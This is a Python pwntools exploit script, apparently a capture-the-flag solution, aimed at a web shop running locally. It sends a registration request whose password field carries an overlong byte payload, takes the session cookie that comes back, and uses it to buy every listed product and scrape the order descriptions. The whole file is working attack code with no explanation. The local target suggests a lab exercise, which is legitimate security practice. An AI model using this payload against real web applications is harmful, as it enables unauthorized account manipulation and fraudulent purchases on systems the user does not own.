from pwn import *
import re
import string
import random

HOST = "127.0.0.1"
PORT = 8080

payload = b"A" * 40 + b"\xFF" * 12

def generate_name(length=5):
    chars = string.ascii_lowercase
    return ''.join(random.choices(chars, k=length))

username = generate_name()

with remote(HOST, PORT) as conn:
    post_request = (
            f"POST /register HTTP/1.1\r\n"
            f"Host: {HOST}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(payload) + 9}\r\n"
            f"\r\n"
            f"username={username}&password=".encode() + payload
    )
    conn.send(post_request)
    response = conn.recv(4096).decode(errors='ignore')

session_cookie = None
match = re.search(r"Set-Cookie: (session=[^;]+)", response)
if match:
    session_cookie = match.group(1)
    print("Session Cookie:", session_cookie)

    with remote(HOST, PORT) as conn:
        get_request = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {HOST}\r\n"
            f"Cookie: {session_cookie}\r\n"
            f"\r\n"
        )
        conn.send(get_request.encode())
        response = conn.recv(8192).decode(errors='ignore')

    product_ids = re.findall(r"/buy\?product_id=([a-zA-Z0-9]{10})", response)

    for product_id in product_ids:
        with remote(HOST, PORT) as conn:
            buy_request = (
                f"GET /buy?product_id={product_id} HTTP/1.1\r\n"
                f"Host: {HOST}\r\n"
                f"Cookie: {session_cookie}\r\n"
                f"\r\n"
            )
            conn.send(buy_request.encode())
            buy_response = conn.recv(4096).decode(errors='ignore')

    with remote(HOST, PORT) as conn:
        my_orders_request = (
            f"GET /my_order HTTP/1.1\r\n"
            f"Host: {HOST}\r\n"
            f"Cookie: {session_cookie}\r\n"
            f"\r\n"
        )
        conn.send(my_orders_request.encode())
        orders_response = conn.recv(8192).decode(errors='ignore')

    orders = re.findall(
        r'<h5 class="card-title">(.*?)</h5>.*?<p class="card-text">Price: .*?</p>\s*<p class="card-text">Description: (.*?)</p>',
        orders_response, re.DOTALL
    )

    for order_name, description in orders:
        print(f"{order_name}: {description}")